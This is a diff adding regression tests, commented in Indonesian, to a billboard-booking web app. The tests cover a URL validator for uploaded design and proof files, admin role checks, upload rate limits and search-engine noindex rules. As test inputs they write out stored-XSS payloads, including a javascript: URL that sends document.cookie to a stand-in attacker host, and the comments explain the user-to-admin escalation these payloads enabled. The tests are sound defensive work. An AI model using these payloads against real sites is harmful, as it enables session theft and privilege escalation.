@@ -131,6 +131,27 @@ const JALUR_ROUTE_ADD_CHARGE = path.join(
   'add-charge',
   'route.ts'
 );
+const JALUR_ROUTE_SUBMIT_DESIGN = path.join(
+  __dirname,
+  '..',
+  'src',
+  'app',
+  'api',
+  'booking',
+  'submit-design',
+  'route.ts'
+);
+const JALUR_ROUTE_DESAIN_INTERNAL = path.join(
+  __dirname,
+  '..',
+  'src',
+  'app',
+  'api',
+  'admin',
+  'orders',
+  'upload-internal-design',
+  'route.ts'
+);
 const JALUR_LAPORAN = path.join(
   __dirname,
   '..',
@@ -5706,5 +5727,630 @@ describe('batas serialisasi props client', () => {
     assert.match(kartu, /bolehBayar/);
     assert.doesNotMatch(kartu, /periksaKelayakanSesi/, 'BookingCard mengulang aturan kelayakan');
     assert.doesNotMatch(kartu, /STATUS_BOLEH_BAYAR_LANJUTAN/, 'BookingCard memegang daftar status');
+  });
+});
+
+// ===========================================================================
+// URL BUKTI — satu penjaga untuk `designFileUrl`, `refundProof`,
+// `installationProof`.
+// ===========================================================================
+
+describe('urlBuktiSah', () => {
+  const JALUR_URL_BUKTI = path.join(__dirname, '..', 'src', 'lib', 'url-bukti.ts');
+  const { urlBuktiSah, AWALAN_UNGGAHAN, BATAS_PANJANG_URL } = require(JALUR_URL_BUKTI);
+
+  it('menerima URL absolut http dan https', () => {
+    assert.equal(
+      urlBuktiSah('https://res.cloudinary.com/demo/image/upload/a.png'),
+      'https://res.cloudinary.com/demo/image/upload/a.png'
+    );
+    assert.equal(urlBuktiSah('http://localhost:4000/a.png'), 'http://localhost:4000/a.png');
+  });
+
+  it('menerima jalur unggahan lokal yang root-relatif', () => {
+    // REGRESI YANG PALING MUDAH KAMBUH. Validator versi lama memakai
+    // `new URL(teks)` tanpa base, yang MELEMPAR untuk bentuk ini lalu
+    // mengembalikan null — sehingga bukti refund dan bukti pemasangan yang
+    // diunggah lewat mode lokal dibuang diam-diam, dan pesanan REFUNDED ditolak
+    // "bukti belum dilampirkan" padahal baru saja diunggah.
+    assert.equal(urlBuktiSah('/uploads/designs/abc.png'), '/uploads/designs/abc.png');
+  });
+
+  it('bentuk yang dikembalikan route unggah benar-benar lolos', () => {
+    // Nilai di bawah disusun dengan rumus yang sama dengan `api/upload/route.ts`
+    // dan `api/upload/design/route.ts` (`/uploads/designs/${randomUUID()}.${ext}`).
+    // Kalau salah satu route itu mengubah bentuk keluarannya, test ini yang
+    // jatuh lebih dulu.
+    for (const ext of ['jpg', 'png', 'webp', 'pdf']) {
+      const url = '/uploads/designs/3f1c9d20-0000-4000-8000-000000000000.' + ext;
+      assert.equal(urlBuktiSah(url), url, 'ekstensi ' + ext + ' ditolak');
+    }
+    assert.equal(AWALAN_UNGGAHAN.includes('/uploads/'), true);
+  });
+
+  it('menolak skema yang bisa dieksekusi browser', () => {
+    // `javascript:` adalah inti kenaikan hak USER menjadi ADMIN: nilainya
+    // berakhir di `href` tombol "Download Desain", dan admin yang menekannya
+    // menjalankan skrip pembeli di origin aplikasi dengan sesi admin.
+    const jahat = [
+      'javascript:alert(1)',
+      'JavaScript:alert(1)',
+      'jAvAsCrIpT:alert(1)',
+      'data:text/html,<script>alert(1)</script>',
+      'data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Lz48L3N2Zz4=',
+      'vbscript:msgbox(1)',
+      'file:///etc/passwd',
+      'ftp://contoh.test/a.png',
+      'blob:https://contoh.test/abcd',
+    ];
+    for (const nilai of jahat) {
+      assert.equal(urlBuktiSah(nilai), null, nilai + ' diterima');
+    }
+  });
+
+  it('menolak URL protocol-relative', () => {
+    // `//penyerang.test/x` bukan jalur relatif: browser membacanya sebagai host
+    // LAIN dengan skema halaman berjalan, jadi ia lolos "diawali /" tapi
+    // sebenarnya memuat berkas dari luar.
+    assert.equal(urlBuktiSah('//penyerang.test/x.png'), null);
+    assert.equal(urlBuktiSah('///penyerang.test/x.png'), null);
+  });
+
+  it('menolak jalur relatif di luar direktori unggahan', () => {
+    for (const jalur of ['/admin/users', '/api/admin/update-order', '/', '/uploads', '/uploadsx/a.png']) {
+      assert.equal(urlBuktiSah(jalur), null, jalur + ' diterima');
+    }
+    assert.equal(urlBuktiSah('/uploads/../../etc/passwd'), null);
+  });
+
+  it('menolak karakter kendali sebelum URL diurai', () => {
+    // `new URL()` MEMBUANG tab dan baris baru sesuai spesifikasi WHATWG, jadi
+    // "java\nscript:alert(1)" bisa lolos sebagai URL sah sementara teks yang
+    // DISIMPAN tetap yang asli — dan teks itulah yang dirender.
+    const jahat = ['java\nscript:alert(1)', 'java\tscript:alert(1)', 'https://a.test/\u0000x'];
+    for (const nilai of jahat) {
+      assert.equal(urlBuktiSah(nilai), null, JSON.stringify(nilai) + ' diterima');
+    }
+  });
+
+  it('menolak nilai yang bukan teks, kosong, atau hanya spasi', () => {
+    for (const nilai of [null, undefined, 0, 1, true, {}, [], '', '   ', '\t\n']) {
+      assert.equal(urlBuktiSah(nilai), null, JSON.stringify(nilai) + ' diterima');
+    }
+  });
+
+  it('merapikan spasi tepi dan memotong pada batas panjang', () => {
+    assert.equal(urlBuktiSah('  https://a.test/x.png  '), 'https://a.test/x.png');
+    const panjang = 'https://a.test/' + 'a'.repeat(BATAS_PANJANG_URL + 500) + '.png';
+    assert.equal(urlBuktiSah(panjang).length, BATAS_PANJANG_URL);
+  });
+});
+
+describe('semua penulis kolom URL memakai urlBuktiSah', () => {
+  function kodeTanpaKomentar(sumber) {
+    return sumber
+      .replace(/\/\*[\s\S]*?\*\//g, '')
+      .split('\n')
+      .filter((baris) => !/^\s*(\/\/|\*)/.test(baris))
+      .join('\n');
+  }
+
+  const PENULIS = [
+    ['submit-design', JALUR_ROUTE_SUBMIT_DESIGN],
+    ['upload-internal-design', JALUR_ROUTE_DESAIN_INTERNAL],
+    ['update-order', JALUR_ROUTE_UPDATE_ORDER],
+  ];
+
+  for (const [nama, jalur] of PENULIS) {
+    it(nama + ' memakai validator bersama, bukan salinannya', () => {
+      const kode = kodeTanpaKomentar(fs.readFileSync(jalur, 'utf8'));
+      assert.match(kode, /urlBuktiSah/, nama + ' tidak memakai urlBuktiSah');
+
+      // Rumus `new URL(...)` yang ditulis ulang di route adalah bentuk yang
+      // MENOLAK jalur unggahan lokal. Satu salinan cukup untuk menghidupkan
+      // kembali bug yang sama di satu kolom.
+      assert.doesNotMatch(kode, /new URL\(/, nama + ' menulis ulang pemeriksaan URL');
+    });
+
+    it(nama + ' tidak menulis nilai body mentah ke kolom URL', () => {
+      const kode = kodeTanpaKomentar(fs.readFileSync(jalur, 'utf8'));
+      // `designFileUrl: designUrl` adalah bentuk persis bug stored-XSS aslinya.
+      assert.doesNotMatch(
+        kode,
+        /(designFileUrl|refundProof|installationProof)\s*:\s*(designUrl|refundProof|installationProof)\b/,
+        nama + ' menulis nilai body mentah ke kolom URL'
+      );
+    });
+  }
+});
+
+describe('route submit-design', () => {
+  const { BookingStatus } = require('@prisma/client');
+
+  function buatDb(status) {
+    const tulisan = [];
+    let baris = { id: 'booking-1', userId: 'user-1', status };
+
+    const prismaPalsu = {
+      async $transaction(kerja) {
+        return await kerja({
+          booking: {
+            async findFirst(args) {
+              // Kepemilikan HARUS ada di `where`, bukan diperiksa sesudahnya.
+              assert.equal(args.where.userId, 'user-1');
+              return args.where.id === baris.id ? { status: baris.status } : null;
+            },
+            async updateMany(args) {
+              tulisan.push(args);
+              if (args.where.status !== baris.status) return { count: 0 };
+              baris = { ...baris, ...args.data };
+              return { count: 1 };
+            },
+          },
+        });
+      },
+    };
+
+    return { prisma: prismaPalsu, tulisan: () => tulisan.slice(), baris: () => ({ ...baris }) };
+  }
+
+  function buatRoute(fake) {
+    return muatDenganModulPalsu(JALUR_ROUTE_SUBMIT_DESIGN, {
+      'next/server': { NextResponse: { json: (isi, init = {}) => new Response(JSON.stringify(isi), init) } },
+      'next-auth': { getServerSession: async () => ({ user: { id: 'user-1', role: 'USER' } }) },
+      '@/lib/auth': { authOptions: {} },
+      '@/lib/prisma': { prisma: fake.prisma },
+    });
+  }
+
+  function permintaan(isi) {
+    return new Request('https://contoh.test/api/booking/submit-design', {
+      method: 'POST',
+      body: JSON.stringify({ orderId: 'booking-1', ...isi }),
+    });
+  }
+
+  it('menyimpan jalur unggahan lokal dan menandai menunggu review', async () => {
+    const fake = buatDb(BookingStatus.PAID_CONFIRMED);
+    const route = buatRoute(fake);
+
+    const response = await route.POST(permintaan({ designUrl: '/uploads/designs/a.png' }));
+
+    assert.equal(response.status, 200);
+    assert.equal(fake.baris().designFileUrl, '/uploads/designs/a.png');
+    assert.equal(fake.baris().status, BookingStatus.DESIGN_RECEIVED);
+    assert.equal(fake.baris().designStatus, 'PENDING_REVIEW');
+    // Alasan penolakan lama harus hilang, kalau tidak pesannya menempel selamanya.
+    assert.equal(fake.baris().designRejectionReason, null);
+  });
+
+  it('menolak designUrl berskema javascript tanpa menulis apa pun', async () => {
+    const fake = buatDb(BookingStatus.PAID_CONFIRMED);
+    const route = buatRoute(fake);
+
+    const response = await route.POST(
+      permintaan({ designUrl: 'javascript:fetch("https://penyerang.test/?c="+document.cookie)' })
+    );
+    const isi = await response.json();
+
+    assert.equal(response.status, 400);
+    assert.match(isi.message, /URL desain tidak valid/);
+    // Nol penulisan: nilainya tidak boleh sampai ke kolom, bahkan sebentar.
+    assert.equal(fake.tulisan().length, 0);
+    assert.equal(fake.baris().designFileUrl, undefined);
+    assert.equal(fake.baris().status, BookingStatus.PAID_CONFIRMED);
+  });
+
+  const URL_DITOLAK = [
+    ['data:', 'data:text/html,<script>alert(1)</script>'],
+    ['protocol-relative', '//penyerang.test/x.png'],
+    ['jalur di luar unggahan', '/admin/users'],
+    ['bukan teks', 12345],
+    ['kosong', '   '],
+    ['hilang', undefined],
+  ];
+
+  for (const [judul, nilai] of URL_DITOLAK) {
+    it('menolak designUrl ' + judul, async () => {
+      const fake = buatDb(BookingStatus.PAID_CONFIRMED);
+      const route = buatRoute(fake);
+
+      const response = await route.POST(permintaan({ designUrl: nilai }));
+
+      assert.equal(response.status, 400);
+      assert.equal(fake.tulisan().length, 0);
+    });
+  }
+
+  it('menolak orderId yang bukan teks', async () => {
+    const fake = buatDb(BookingStatus.PAID_CONFIRMED);
+    const route = buatRoute(fake);
+
+    for (const orderId of [null, 42, {}, '', '   ']) {
+      const response = await route.POST(
+        new Request('https://contoh.test/api/booking/submit-design', {
+          method: 'POST',
+          body: JSON.stringify({ orderId, designUrl: '/uploads/designs/a.png' }),
+        })
+      );
+      assert.equal(response.status, 400, 'orderId ' + JSON.stringify(orderId) + ' lolos');
+    }
+    assert.equal(fake.tulisan().length, 0);
+  });
+
+  it('body bukan JSON dijawab 400, bukan 500', async () => {
+    const fake = buatDb(BookingStatus.PAID_CONFIRMED);
+    const route = buatRoute(fake);
+
+    const response = await route.POST(
+      new Request('https://contoh.test/api/booking/submit-design', { method: 'POST', body: 'bukan json' })
+    );
+
+    assert.equal(response.status, 400);
+    assert.equal(fake.tulisan().length, 0);
+  });
+
+  const STATUS_DITOLAK = [
+    BookingStatus.IN_PRODUCTION,
+    BookingStatus.INSTALLATION,
+    BookingStatus.ACTIVE,
+    BookingStatus.REFUNDED,
+    BookingStatus.CANCELLED,
+    BookingStatus.PROCESS_REFUND,
+    BookingStatus.WAITING_BANK,
+  ];
+
+  for (const status of STATUS_DITOLAK) {
+    it('menolak pengiriman desain pada pesanan ' + status, async () => {
+      // Tanpa gerbang ini, pemilik pesanan bisa menarik pesanan yang
+      // billboardnya SUDAH tercetak dan terpasang kembali ke antrean "desain
+      // masuk" dengan berkas baru, kapan pun ia mau.
+      const fake = buatDb(status);
+      const route = buatRoute(fake);
+
+      const response = await route.POST(permintaan({ designUrl: '/uploads/designs/a.png' }));
+
+      assert.equal(response.status, 409);
+      assert.equal(fake.baris().status, status);
+      assert.equal(fake.tulisan().length, 0);
+    });
+  }
+
+  for (const status of [BookingStatus.PENDING_PAYMENT, BookingStatus.PAID_CONFIRMED]) {
+    it('menerima pengiriman desain pada pesanan ' + status, async () => {
+      const fake = buatDb(status);
+      const route = buatRoute(fake);
+
+      const response = await route.POST(permintaan({ designUrl: '/uploads/designs/a.png' }));
+
+      assert.equal(response.status, 200);
+      assert.equal(fake.baris().status, BookingStatus.DESIGN_RECEIVED);
+    });
+  }
+
+  it('mengizinkan kiriman ulang pada pesanan yang sudah DESIGN_RECEIVED', async () => {
+    // Desain yang ditolak admin harus bisa dikirim ulang; `transisiSah`
+    // mengembalikan true untuk status yang sama.
+    const fake = buatDb(BookingStatus.DESIGN_RECEIVED);
+    const route = buatRoute(fake);
+
+    const response = await route.POST(permintaan({ designUrl: '/uploads/designs/b.png' }));
+
+    assert.equal(response.status, 200);
+    assert.equal(fake.baris().designFileUrl, '/uploads/designs/b.png');
+  });
+
+  it('pesanan milik orang lain dijawab 404', async () => {
+    const fake = buatDb(BookingStatus.PAID_CONFIRMED);
+    const route = buatRoute(fake);
+
+    const response = await route.POST(
+      new Request('https://contoh.test/api/booking/submit-design', {
+        method: 'POST',
+        body: JSON.stringify({ orderId: 'booking-lain', designUrl: '/uploads/designs/a.png' }),
+      })
+    );
+
+    assert.equal(response.status, 404);
+    assert.equal(fake.tulisan().length, 0);
+  });
+
+  it('status ikut di where agar dua kiriman bersamaan tidak saling menimpa', async () => {
+    const fake = buatDb(BookingStatus.PAID_CONFIRMED);
+    const route = buatRoute(fake);
+
+    await route.POST(permintaan({ designUrl: '/uploads/designs/a.png' }));
+
+    const args = fake.tulisan()[0];
+    assert.equal(args.where.status, BookingStatus.PAID_CONFIRMED);
+    assert.equal(args.where.userId, 'user-1');
+  });
+
+  it('tidak mencatat objek galat mentah', async () => {
+    // Galat Prisma membawa query beserta nilai kolomnya, termasuk data pembeli.
+    const kode = fs.readFileSync(JALUR_ROUTE_SUBMIT_DESIGN, 'utf8');
+    assert.doesNotMatch(kode, /console\.error\(\s*(error|err|e)\s*[,)]/);
+  });
+});
+
+describe('route upload-internal-design', () => {
+  function buatRoute(role = 'OPERATOR') {
+    const tulisan = [];
+    const route = muatDenganModulPalsu(JALUR_ROUTE_DESAIN_INTERNAL, {
+      'next/server': { NextResponse: { json: (isi, init = {}) => new Response(JSON.stringify(isi), init) } },
+      'next-auth': { getServerSession: async () => ({ user: { id: 'staf-1', role } }) },
+      '@/lib/auth': { authOptions: {} },
+      '@/lib/prisma': {
+        prisma: {
+          booking: {
+            async updateMany(args) {
+              tulisan.push(args);
+              return { count: args.where.id === 'booking-1' ? 1 : 0 };
+            },
+          },
+        },
+      },
+    });
+    return { route, tulisan: () => tulisan.slice() };
+  }
+
+  function permintaan(isi) {
+    return new Request('https://contoh.test/api/admin/orders/upload-internal-design', {
+      method: 'POST',
+      body: JSON.stringify({ orderId: 'booking-1', ...isi }),
+    });
+  }
+
+  it('menyimpan desain internal dan langsung menyetujuinya', async () => {
+    const { route, tulisan } = buatRoute();
+
+    const response = await route.POST(permintaan({ designUrl: '/uploads/designs/a.png' }));
+
+    assert.equal(response.status, 200);
+    assert.equal(tulisan()[0].data.designFileUrl, '/uploads/designs/a.png');
+    assert.equal(tulisan()[0].data.designStatus, 'APPROVED');
+    assert.ok(tulisan()[0].data.designApprovedAt instanceof Date);
+  });
+
+  it('operator tidak bisa menanam URL yang dieksekusi admin', async () => {
+    // Perannya termasuk OPERATOR dan hasilnya langsung `APPROVED`, jadi nilai di
+    // sini adalah desain final yang dibuka ADMIN.
+    const { route, tulisan } = buatRoute('OPERATOR');
+
+    const jahat = [
+      'javascript:alert(document.cookie)',
+      'data:text/html,<script>1</script>',
+      '//penyerang.test/a.png',
+      '/admin/users',
+      '',
+    ];
+    for (const nilai of jahat) {
+      const response = await route.POST(permintaan({ designUrl: nilai }));
+      assert.equal(response.status, 400, JSON.stringify(nilai) + ' diterima');
+    }
+    assert.equal(tulisan().length, 0);
+  });
+
+  it('menolak peran di luar daftar', async () => {
+    const { route, tulisan } = buatRoute('USER');
+    const response = await route.POST(permintaan({ designUrl: '/uploads/designs/a.png' }));
+    assert.equal(response.status, 401);
+    assert.equal(tulisan().length, 0);
+  });
+
+  it('SUPER_ADMIN tetap diterima', async () => {
+    const { route } = buatRoute('SUPER_ADMIN');
+    const response = await route.POST(permintaan({ designUrl: '/uploads/designs/a.png' }));
+    assert.equal(response.status, 200);
+  });
+
+  it('pesanan tidak ditemukan dijawab 404, bukan 500', async () => {
+    const { route } = buatRoute();
+    const response = await route.POST(
+      new Request('https://contoh.test/api/admin/orders/upload-internal-design', {
+        method: 'POST',
+        body: JSON.stringify({ orderId: 'tidak-ada', designUrl: '/uploads/designs/a.png' }),
+      })
+    );
+    assert.equal(response.status, 404);
+  });
+
+  it('body bukan JSON dijawab 400, bukan 500', async () => {
+    const { route, tulisan } = buatRoute();
+    const response = await route.POST(
+      new Request('https://contoh.test/api/admin/orders/upload-internal-design', {
+        method: 'POST',
+        body: 'bukan json',
+      })
+    );
+    assert.equal(response.status, 400);
+    assert.equal(tulisan().length, 0);
+  });
+
+  it('orderId bukan teks dijawab 400', async () => {
+    const { route, tulisan } = buatRoute();
+    for (const orderId of [null, 7, {}, '  ']) {
+      const response = await route.POST(
+        new Request('https://contoh.test/api/admin/orders/upload-internal-design', {
+          method: 'POST',
+          body: JSON.stringify({ orderId, designUrl: '/uploads/designs/a.png' }),
+        })
+      );
+      assert.equal(response.status, 400, 'orderId ' + JSON.stringify(orderId) + ' lolos');
+    }
+    assert.equal(tulisan().length, 0);
+  });
+});
+
+describe('gerbang peran admin tidak mengunci SUPER_ADMIN', () => {
+  const AKAR_API = path.join(__dirname, '..', 'src', 'app', 'api');
+
+  function berkasRoute(dir) {
+    const hasil = [];
+    for (const entri of fs.readdirSync(dir, { withFileTypes: true })) {
+      const jalur = path.join(dir, entri.name);
+      if (entri.isDirectory()) hasil.push(...berkasRoute(jalur));
+      else if (entri.name === 'route.ts') hasil.push(jalur);
+    }
+    return hasil;
+  }
+
+  it('tidak ada route yang memakai perbandingan role tunggal ke ADMIN', () => {
+    // Bentuk `role !== 'ADMIN'` MENOLAK pemegang peran tertinggi: SUPER_ADMIN
+    // hanya menerima "Akses Ditolak" di fitur yang seharusnya paling ia kuasai.
+    // Kesalahan yang sama pernah diperbaiki di `admin/users/delete`, lalu muncul
+    // lagi di dua route billboard.
+    const pelanggar = [];
+    for (const jalur of berkasRoute(AKAR_API)) {
+      const kode = fs
+        .readFileSync(jalur, 'utf8')
+        .replace(/\/\*[\s\S]*?\*\//g, '')
+        .split('\n')
+        .filter((baris) => !/^\s*(\/\/|\*)/.test(baris))
+        .join('\n');
+      if (/role\s*!==\s*['"]ADMIN['"]/.test(kode)) {
+        pelanggar.push(path.relative(AKAR_API, jalur));
+      }
+    }
+    assert.deepEqual(pelanggar, []);
+  });
+
+  const ROUTE_ADMIN_KETAT = [
+    ['billboards/create', ['admin', 'billboards', 'create']],
+    ['billboards/rollback', ['admin', 'billboards', 'rollback']],
+    ['users/delete', ['admin', 'users', 'delete']],
+  ];
+
+  for (const [nama, bagian] of ROUTE_ADMIN_KETAT) {
+    it(nama + ' menerima ADMIN dan SUPER_ADMIN', () => {
+      const jalur = path.join(AKAR_API, ...bagian, 'route.ts');
+      const kode = fs.readFileSync(jalur, 'utf8');
+      assert.match(kode, /SUPER_ADMIN/, nama + ' tidak menyebut SUPER_ADMIN');
+      assert.match(kode, /\[\s*['"]ADMIN['"]\s*,\s*['"]SUPER_ADMIN['"]\s*\]/, nama + ' bukan daftar peran');
+    });
+  }
+});
+
+describe('route unggah berkas dibatasi lajunya', () => {
+  const ROUTE_UNGGAH = [
+    ['upload', path.join(__dirname, '..', 'src', 'app', 'api', 'upload', 'route.ts')],
+    ['upload/design', path.join(__dirname, '..', 'src', 'app', 'api', 'upload', 'design', 'route.ts')],
+  ];
+
+  function kodeTanpaKomentar(jalur) {
+    return fs
+      .readFileSync(jalur, 'utf8')
+      .replace(/\/\*[\s\S]*?\*\//g, '')
+      .split('\n')
+      .filter((baris) => !/^\s*(\/\/|\*)/.test(baris))
+      .join('\n');
+  }
+
+  for (const [nama, jalur] of ROUTE_UNGGAH) {
+    it(nama + ' memanggil rateLimit sebelum membaca body', () => {
+      const kode = kodeTanpaKomentar(jalur);
+
+      assert.match(kode, /rateLimit\(\{/, nama + ' tidak memanggil rateLimit');
+      assert.match(kode, /rateLimitHeaders\(/, nama + ' tidak mengirim header sisa jatah');
+
+      // Membaca body berarti menerima 10 MB ke memori proses; menolak SESUDAH
+      // itu tidak menghemat apa pun.
+      const posisiBatas = kode.indexOf('rateLimit({');
+      const posisiBody = kode.indexOf('formData()');
+      assert.ok(posisiBatas > 0, nama + ': panggilan rateLimit tidak ditemukan');
+      assert.ok(posisiBody > 0, nama + ': panggilan formData tidak ditemukan');
+      assert.ok(posisiBatas < posisiBody, nama + ' membaca body sebelum memeriksa batas');
+    });
+
+    it(nama + ' memakai kunci per pengguna, bukan per alamat IP', () => {
+      // IP bersama (kantor, kampus, operator seluler) membuat satu pengunggah
+      // menghabiskan jatah seluruh gedung; id sesi tidak bisa dipalsukan pembeli.
+      const kode = kodeTanpaKomentar(jalur);
+      assert.match(kode, /key:\s*`[^`]*\$\{session\.user\.id\}`/, nama + ' tidak memakai id sesi');
+    });
+
+    it(nama + ' tidak mencatat jalur berkas absolut', () => {
+      // `${filePath}` memuat struktur direktori server apa adanya.
+      const kode = fs.readFileSync(jalur, 'utf8');
+      assert.doesNotMatch(kode, /console\.\w+\([^)]*\$\{filePath\}/, nama + ' mencatat jalur absolut');
+    });
+  }
+
+  it('dua route unggah tidak berbagi satu jatah', () => {
+    // Kunci yang sama membuat unggahan gambar biasa menghabiskan jatah unggahan
+    // desain, dan pembeli kehilangan jalur mengirim desainnya.
+    const kunci = ROUTE_UNGGAH.map(([, jalur]) => {
+      const cocok = kodeTanpaKomentar(jalur).match(/key:\s*`([^`]*)`/);
+      assert.ok(cocok, 'kunci rate limit tidak ditemukan di ' + jalur);
+      return cocok[1];
+    });
+    assert.notEqual(kunci[0], kunci[1]);
+  });
+});
+
+describe('area privat tidak boleh masuk indeks pencarian', () => {
+  const JALUR_ROBOTS = path.join(__dirname, '..', 'src', 'app', 'robots.ts');
+
+  function muatRobots() {
+    delete require.cache[require.resolve(JALUR_ROBOTS)];
+    return require(JALUR_ROBOTS).default();
+  }
+
+  it('melarang perangkakan seluruh area yang menuntut login', () => {
+    const larangan = muatRobots().rules[0].disallow;
+
+    // Sejalan dengan `matcher` di `src/middleware.ts`. Middleware yang menahan
+    // PEMBACAAN tidak menahan pengindeksan pola alamat.
+    for (const jalur of ['/admin', '/dashboard', '/checkout', '/invoice', '/api/']) {
+      assert.ok(larangan.includes(jalur), jalur + ' tidak dilarang');
+    }
+  });
+
+  it('tidak menunjuk sitemap yang tidak ada', () => {
+    const adaSitemap =
+      fs.existsSync(path.join(__dirname, '..', 'src', 'app', 'sitemap.ts')) ||
+      fs.existsSync(path.join(__dirname, '..', 'public', 'sitemap.xml'));
+    if (!adaSitemap) {
+      assert.equal(muatRobots().sitemap, undefined, 'menunjuk sitemap yang menjawab 404');
+    }
+  });
+
+  it('tidak melempar walau APP_ORIGIN kosong', () => {
+    // `/robots.txt` yang menjawab 500 lebih buruk daripada robots.txt tanpa
+    // baris sitemap. `originAplikasi()` MELEMPAR bila variabelnya kosong atau
+    // bukan https, jadi route ini sengaja tidak memakainya.
+    const asli = process.env.APP_ORIGIN;
+    try {
+      delete process.env.APP_ORIGIN;
+      assert.doesNotThrow(muatRobots);
+      process.env.APP_ORIGIN = 'http://bukan-https.test';
+      assert.doesNotThrow(muatRobots);
+    } finally {
+      if (asli === undefined) delete process.env.APP_ORIGIN;
+      else process.env.APP_ORIGIN = asli;
+      delete require.cache[require.resolve(JALUR_ROBOTS)];
+    }
+  });
+
+  for (const area of ['admin', 'dashboard', 'invoice', 'checkout']) {
+    it('layout /' + area + ' menyetel noindex', () => {
+      const jalur = path.join(__dirname, '..', 'src', 'app', area, 'layout.tsx');
+      assert.ok(fs.existsSync(jalur), 'src/app/' + area + '/layout.tsx tidak ada');
+      const kode = fs.readFileSync(jalur, 'utf8');
+      assert.match(kode, /METADATA_PRIVAT/, 'layout /' + area + ' tidak memakai konstanta bersama');
+      assert.match(kode, /export const metadata/, 'layout /' + area + ' tidak mengekspor metadata');
+    });
+  }
+
+  it('layout admin berada di luar grup (dashboard) agar /admin/login ikut tertutup', () => {
+    // `/admin/login` tidak berada di dalam grup `(dashboard)`, jadi layout grup
+    // tidak menyentuhnya sama sekali.
+    assert.ok(fs.existsSync(path.join(__dirname, '..', 'src', 'app', 'admin', 'layout.tsx')));
+  });
+
+  it('konstanta privat benar-benar noindex dan nofollow', () => {
+    const { METADATA_PRIVAT } = require(path.join(__dirname, '..', 'src', 'lib', 'metadata-privat.ts'));
+    assert.equal(METADATA_PRIVAT.robots.index, false);
+    assert.equal(METADATA_PRIVAT.robots.follow, false);
   });
 });
